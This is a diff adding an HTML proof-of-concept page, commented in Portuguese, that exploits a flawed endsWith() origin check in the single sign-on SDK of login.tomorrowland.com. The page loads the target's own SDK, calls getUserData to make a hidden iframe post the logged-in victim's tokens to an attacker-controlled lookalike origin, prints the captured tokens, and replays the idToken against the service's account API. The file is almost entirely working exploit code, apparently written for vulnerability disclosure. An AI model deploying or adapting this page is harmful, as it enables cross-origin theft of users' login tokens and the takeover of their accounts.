@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<!-- garante que a origem vaze no document.referrer do iframe -->
+<meta name="referrer" content="unsafe-url">
+<title>TML SSO origin-check bypass PoC</title>
+<style>body{font:14px/1.5 monospace;padding:24px;background:#111;color:#0f0}pre{white-space:pre-wrap;word-break:break-all}h1{color:#fff}</style>
+</head>
+<body>
+<h1>Tomorrowland SSO — cross-origin token theft PoC</h1>
+<p>Origem desta página: <b id="org"></b> (precisa terminar em "tomorrowland.com" e ser HTTPS)</p>
+<p>Status: <b id="st">carregando SDK...</b></p>
+<pre id="out"></pre>
+
+<!-- 1) Carrega a PRÓPRIA SDK do alvo -->
+<script src="https://login.tomorrowland.com/lib/tml-sso.iife.js"></script>
+<script>
+  document.getElementById('org').textContent = location.origin;
+  const st = document.getElementById('st');
+  const out = document.getElementById('out');
+
+  if (!window.TmlSso || !TmlSso.getUserData) {
+    st.textContent = 'SDK não carregou (TmlSso ausente)';
+  } else {
+    st.textContent = 'SDK ok — chamando getUserData() (vítima precisa estar logada em login.tomorrowland.com)...';
+
+    // 2) Chama o fluxo headless. O iframe oculto /headless/getUserData
+    //    posta os tokens pra ESTA janela porque o endsWith() aceita nossa origem.
+    TmlSso.getUserData('https://login.tomorrowland.com')
+      .then(async (data) => {
+        st.textContent = '🔓 TOKENS CAPTURADOS de outra origem!';
+        out.textContent = JSON.stringify(data, null, 2);
+        console.log('STOLEN', data);
+
+        // 3) (Opcional) prova de impacto: troca o idToken por um token de conta
+        //    via api.tomorrowland.com/account?token=true  (Authorization: idToken)
+        const idToken = data?.tokens?.idToken;
+        if (idToken) {
+          try {
+            const r = await fetch('https://api.tomorrowland.com/account?token=true', {
+              headers: { 'x-auth-type': 'tomorrowland', 'Authorization': idToken }
+            });
+            out.textContent += '\n\n--- /account?token=true ---\n' + await r.text();
+          } catch (e) { out.textContent += '\n\n(account fetch falhou: ' + e + ')'; }
+        }
+      })
+      .catch((e) => { st.textContent = 'erro: ' + e; });
+  }
+</script>
+</body>
+</html>
